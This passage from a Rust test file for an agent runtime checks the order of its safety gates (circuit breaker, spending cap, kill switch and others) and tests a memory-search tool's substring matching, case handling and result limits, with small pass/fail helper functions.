    let ctx = runner7.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot);
    let mut log = GateCheckLog::default();
    let _ = runner7.check_gates(&ctx, &mut log);
    let expected = vec![
        "circuit_breaker",
        "recursion_depth",
        "damage_counter",
        "spending_cap",
        "kill_switch",
        "kill_gate",
    ];
    if log.checks == expected {
        ok(passed);
    } else {
        fail(failed, &format!("order: {:?}", log.checks));
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Memory tool
// ═══════════════════════════════════════════════════════════════════════

fn memory_tool_tests(passed: &mut u32, failed: &mut u32) {
    let memories = vec![
        serde_json::json!({"type": "goal", "content": "Learn Rust programming"}),
        serde_json::json!({"type": "fact", "content": "User prefers dark mode"}),
        serde_json::json!({"type": "goal", "content": "Build autonomous agent"}),
        serde_json::json!({"type": "fact", "content": "Project uses blake3 hashing"}),
    ];

    // 64. Substring match finds relevant memories
    print_test("memory: substring match finds 'Rust'");
    let result = read_memories("rust", 10, &memories);
    if result.total_count == 1 && result.memories[0].to_string().contains("Rust") {
        ok(passed);
    } else {
        fail(failed, &format!("count={}", result.total_count));
    }

    // 65. Case-insensitive matching
    print_test("memory: case-insensitive match 'DARK MODE'");
    let result = read_memories("DARK MODE", 10, &memories);
    if result.total_count == 1 {
        ok(passed);
    } else {
        fail(failed, &format!("count={}", result.total_count));
    }

    // 66. Limit respected
    print_test("memory: limit=1 returns at most 1");
    let result = read_memories("goal", 1, &memories);
    if result.total_count == 1 {
        ok(passed);
    } else {
        fail(failed, &format!("count={}", result.total_count));
    }

    // 67. No match returns empty
    print_test("memory: no match returns empty");
    let result = read_memories("nonexistent_query_xyz", 10, &memories);
    if result.total_count == 0 && result.memories.is_empty() {
        ok(passed);
    } else {
        fail(failed, &format!("count={}", result.total_count));
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════════════

fn make_call(name: &str, args: serde_json::Value) -> LLMToolCall {
    LLMToolCall {
        id: Uuid::now_v7().to_string(),
        name: name.to_string(),
        arguments: args,
    }
}

fn make_plan(calls: Vec<LLMToolCall>) -> ToolCallPlan {
    ToolCallPlan::new(calls)
}

fn print_test(name: &str) {
    print!("  {:.<60} ", name);
}

fn ok(passed: &mut u32) {
    *passed += 1;
    println!("OK");
}

fn fail(failed: &mut u32, msg: &str) {
    *failed += 1;
    println!("FAIL: {}", msg);
}
